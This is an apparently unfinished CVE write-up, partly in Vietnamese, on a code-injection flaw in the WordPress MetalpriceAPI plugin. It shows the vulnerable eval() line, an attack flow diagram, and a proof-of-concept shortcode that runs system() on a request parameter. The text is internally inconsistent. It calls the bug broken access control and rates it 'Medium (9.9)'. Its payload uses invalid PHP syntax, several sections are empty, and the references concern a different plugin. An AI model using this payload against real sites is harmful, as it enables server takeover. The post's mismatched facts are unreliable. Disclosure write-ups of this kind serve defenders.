---
title: CVE-2024-8672 Analysis & POC
description: Security Vulnerability in WordPress MetalpriceAPI Plugin.
date: 2025-12-07 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, broken access control]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng Improper Control of Generation of Code ("Code Injection") trong MetalpriceAPI cho phép thực hiện Code Injection. Vấn đề này ảnh hưởng đến MetalpriceAPI: từ n/a đến phiên bản **1.1.4**.

* **CVE ID**: [CVE-2024-8672](https://www.cve.org/CVERecord?id=CVE-2024-8672)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 1.1.4
* **Patched Versions**: 1.1.5
* **CVSS severity**: Medium (9.9)
* **Required Privilege**: Contributor
* **Product**: [WordPress MetalpriceAPI Plugin](https://wordpress.org/plugins/metalpriceapi/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **MetalpriceAPI**:  
    * `1.1.4` – **vulnerable**  
    * `1.1.5` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause 
**Trong phiên bản lỗi (v1.1.4):**

```php {title="index.php v1.1.4" data-open=true hl_lines=[4]}
if (isset($attrs['operation'])) {
    $operation = $attrs['operation'];
    $operation = str_replace('(value)', $price, $operation);
    eval('$price = ' . $operation . ';');
}
```


```php {title="index.php v1.1.4" data-open=true hl_lines=[4]}

```
## Analysis

## Flow
{{< mermaid >}}
graph TD
A["Attacker with Contributor (or higher) role"]
--> B["Creates or edits a post/content"]
--> C["Inserts [metalpriceapi operation=payload]"]
--> D["WordPress renders the shortcode"]
--> E["Plugin executes shortcode() function"]
--> F["operation is concatenated into a PHP expression"]
--> G["eval() executes the attacker‑controlled input"]
--> H["Remote Code Execution (RCE) on the server"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo post bằng Contributor account
2. Thêm shortcode:

```
[metalpriceapi operation='"abc";system($_REQUEST("cmd"));die()']
```

![Result](result.png "Kết quả")

## Conclusion


## Key Takeaways


## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress Beaver Builder Plugin <= 2.9.4 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability)